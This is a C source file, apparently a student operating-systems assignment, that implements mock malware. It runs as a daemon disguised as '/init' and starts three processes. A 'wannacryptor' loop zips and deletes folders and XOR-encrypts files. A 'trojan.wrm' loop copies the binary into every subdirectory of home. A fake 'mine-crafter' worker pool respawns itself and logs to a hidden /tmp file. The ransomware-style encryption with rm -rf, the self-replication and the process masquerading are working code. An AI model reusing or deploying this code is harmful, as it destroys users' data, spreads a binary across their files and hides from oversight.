#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <pthread.h>
#include <sys/prctl.h>

#define MAX_MINER 4
#define FOLDER_TARGET "/home/zika/Documents/sisop/shift2/soal_3/test"  // Target directory

char *timestamp_key;
extern char **environ; 

void rename_process(const char *name, char *argv[]) {
    prctl(PR_SET_NAME, name, 0, 0, 0);

    size_t total_len = 0;
    for (int i = 0; argv[i]; ++i)
        total_len += strlen(argv[i]) + 1;
    for (int i = 0; environ[i]; ++i)
        total_len += strlen(environ[i]) + 1;

    memset(argv[0], 0, total_len);
    strncpy(argv[0], name, total_len - 1);
    argv[1] = NULL;
}

void xor_encrypt(const char *path) {
    FILE *f = fopen(path, "rb+");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    char *buffer = malloc(size);
    if (!buffer) {
        fclose(f);
        return;
    }
    fread(buffer, 1, size, f);
    rewind(f);
    for (long i = 0; i < size; i++)
        buffer[i] ^= timestamp_key[i % strlen(timestamp_key)];
    fwrite(buffer, 1, size, f);

    free(buffer);
    fclose(f);
}

void zip_and_encrypt(const char *folder_path) {
    char zip_cmd[8192];
    snprintf(zip_cmd, sizeof(zip_cmd), "zip -r -q '%s.zip' '%s' && rm -rf '%s'", folder_path, folder_path, folder_path);
    system(zip_cmd);

    char zip_file[4096];
    snprintf(zip_file, sizeof(zip_file), "%s.zip", folder_path);
    xor_encrypt(zip_file);
}

void wannacryptor(const char *target) {
    DIR *dir = opendir(target);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        char path[4096];
        snprintf(path, sizeof(path), "%s/%s", target, entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            // For kelompok GENAP â†’ ZIP + XOR + delete
            zip_and_encrypt(path);
        } else if (S_ISREG(st.st_mode)) {
            xor_encrypt(path);
        }
    }
    closedir(dir);
}

void *loop_crypto(void *arg) {
    while (1) {
        wannacryptor(FOLDER_TARGET);
        sleep(30);
    }
}

// --- TROJAN REPLIKASI ---
void replicate_recursive(const char *dir_path) {
    DIR *dir = opendir(dir_path);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        char path[4096];
        snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            DIR *sub = opendir(path);
            if (sub) {
                closedir(sub);

                replicate_recursive(path);

                char dest[8192]; // <-- Ukuran buffer diperbesar
                snprintf(dest, sizeof(dest), "%s/runme", path);

                FILE *src = fopen("/home/zika/Documents/sisop/shift2/soal_3/runme", "rb");
                FILE *dst = fopen(dest, "wb");
                if (src && dst) {
                    char buf[1024];
                    size_t n;
                    while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
                        fwrite(buf, 1, n, dst);
                }
                if (src) fclose(src);
                if (dst) fclose(dst);
            }
        }
    }
    closedir(dir);
}


void replicate_malware() {
    char *home = getenv("home");
    if (!home) return;
    replicate_recursive(home);
}

void *loop_replicate(void *arg) {
    while (1) {
        replicate_malware();
        sleep(30);
    }
}

// --- MINE-CRAFTER ---
char *generate_random_hash() {
    static const char hex[] = "0123456789abcdef";
    static char hash[65];
    for (int i = 0; i < 64; i++) {
        hash[i] = hex[rand() % 16];
    }
    hash[64] = '\0';
    return hash;
}

void log_miner_hash(int id, const char *hash) {
    FILE *f = fopen("/tmp/.miner.log", "a");
    if (!f) return;

    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char timebuf[32];
    strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", tm_info);

    fprintf(f, "[%s][Miner %02d] %s\n", timebuf, id, hash);
    fclose(f);
}

void mine_crafter_worker(int id) {
    prctl(PR_SET_PDEATHSIG, SIGTERM);

    char name[32];
    snprintf(name, sizeof(name), "mine-crafter-%d", id);
    prctl(PR_SET_NAME, name, 0, 0, 0);

    srand(time(NULL) ^ (getpid() << 16));

    while (1) {
        int wait_time = (rand() % 28) + 3;
        sleep(wait_time);

        char *hash = generate_random_hash();
        log_miner_hash(id, hash);
    }
}

void start_wannacryptor() {
    prctl(PR_SET_NAME, "wannacryptor");
    pthread_t t;
    pthread_create(&t, NULL, loop_crypto, NULL);
    pthread_join(t, NULL);
}

void start_trojan() {
    prctl(PR_SET_NAME, "trojan.wrm");
    pthread_t t;
    pthread_create(&t, NULL, loop_replicate, NULL);
    pthread_join(t, NULL);
}

void start_rodok(int argc, char *argv[]) {
    int max_forks = 4;
    pid_t pids[max_forks];
    char name[32];

    for (int i = 0; i < max_forks; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            snprintf(name, sizeof(name), "mine-crafter-%d", i);
            rename_process(name, argv);

            mine_crafter_worker(i);
            exit(0);
        } else if (pid > 0) {
            pids[i] = pid;
        }
    }

    while (1) {
        int status;
        pid_t ret_pid = waitpid(-1, &status, WNOHANG);
        if (ret_pid == 0) {
            for (int i = 0; i < max_forks; i++) {
                int child_status;
                pid_t child_pid = waitpid(pids[i], &child_status, WNOHANG);
                if (child_pid > 0 && (WIFEXITED(child_status) || WIFSIGNALED(child_status))) {
                    FILE *f = fopen("/tmp/.miner.log", "a");
                    if (f) {
                        fprintf(f, "Mine-crafter-%d mati. Fork ulang.\n", i);
                        fclose(f);
                    }

                    pid_t new_pid = fork();
                    if (new_pid == 0) {
                        snprintf(name, sizeof(name), "mine-crafter-%d", i);
                        rename_process(name, argv);

                        mine_crafter_worker(i);
                        exit(0);
                    } else if (new_pid > 0) {
                        pids[i] = new_pid;
                    }
                }
            }
        } else if (ret_pid > 0) {
            FILE *f = fopen("/tmp/.miner.log", "a");
            if (f) {
                fprintf(f, "Rodok.exe mati. Semua anak dimatikan.\n");
                fclose(f);
            }
            for (int i = 0; i < max_forks; i++) {
                kill(pids[i], SIGKILL);
            }
            break;
        }

        sleep(1);
    }
}

// --- DAEMONIZATION ---
void daemonize(char *argv[]) {
    pid_t pid = fork();
    if (pid > 0) exit(0);
    if (pid < 0) exit(1);

    setsid();
    pid = fork();
    if (pid > 0) exit(0);

    chdir("/");
    fclose(stdin); fclose(stdout); fclose(stderr);

    rename_process("/init", argv);
}

int main(int argc, char *argv[]) {
    srand(time(NULL));
    time_t t = time(NULL);
    asprintf(&timestamp_key, "%ld", t);

    daemonize(argv);

    pid_t pid1 = fork();
    if (pid1 == 0) {
        rename_process("wannacryptor", argv);
        start_wannacryptor();
        exit(0);
    }

    pid_t pid2 = fork();
    if (pid2 == 0) {
        rename_process("trojan.wrm", argv);
        start_trojan();
        exit(0);
    }

    pid_t pid3 = fork();
    if (pid3 == 0) {
        rename_process("rodok.exe", argv);
        start_rodok(argc, argv);
        exit(0);
    }

    while (1) pause();
    return 0;
}